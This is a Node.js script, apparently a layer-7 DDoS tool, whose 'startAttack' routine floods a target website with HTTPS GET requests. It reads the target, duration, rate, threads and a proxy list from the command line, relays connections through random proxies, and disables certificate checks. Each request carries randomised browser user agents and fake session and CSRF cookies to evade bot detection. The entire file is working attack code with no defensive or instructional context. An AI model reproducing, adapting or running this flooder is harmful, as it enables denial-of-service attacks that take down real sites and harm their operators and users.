const net = require("net");
const tls = require("tls");
const crypto = require("crypto");

const config = {
    target: process.argv[2],
    duration: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxies: require("fs").readFileSync(process.argv[6], "utf-8").split("\n")
};

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomHex(len = 16) {
    return crypto.randomBytes(len).toString("hex");
}

function generateUserAgent() {
    const browsers = [
        "Chrome/120.0.0.0",
        "Firefox/115.0",
        "Safari/537.36"
    ];

    const os = [
        "Windows NT 10.0; Win64; x64",
        "X11; Linux x86_64",
        "Macintosh; Intel Mac OS X 10_15_7"
    ];

    return `Mozilla/5.0 (${randomElement(os)}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomElement(browsers)}`;
}

function generateCookies() {
    return [
        `sessionid=${randomHex(8)}`,
        `csrftoken=${randomHex(8)}`,
        `userid=${randomHex(6)}`
    ].join("; ");
}

function buildRequest(host) {
    return [
        `GET / HTTP/1.1`,
        `Host: ${host}`,
        `User-Agent: ${generateUserAgent()}`,
        `Accept: text/html,application/xhtml+xml`,
        `Accept-Encoding: gzip, deflate`,
        `Connection: keep-alive`,
        `Cookie: ${generateCookies()}`,
        `\r\n`
    ].join("\r\n");
}

function startAttack() {
    const endTime = Date.now() + config.duration * 1000;

    for (let i = 0; i < config.threads; i++) {
        setInterval(() => {
            if (Date.now() > endTime) process.exit(0);

            for (let j = 0; j < config.rate; j++) {

                const proxy = randomElement(config.proxies).split(":");
                const socket = net.connect(proxy[1], proxy[0]);

                socket.setTimeout(10000);

                socket.once("connect", () => {
                    socket.write(`CONNECT ${config.target}:443 HTTP/1.1\r\nHost: ${config.target}\r\n\r\n`);
                });

                socket.once("data", () => {
                    const tlsSocket = tls.connect({
                        socket: socket,
                        servername: config.target,
                        rejectUnauthorized: false
                    }, () => {
                        const request = buildRequest(config.target);
                        tlsSocket.write(request);
                    });

                    tlsSocket.on("error", () => tlsSocket.destroy());
                });

                socket.on("error", () => socket.destroy());
            }

        }, 1000);
    }
}

startAttack();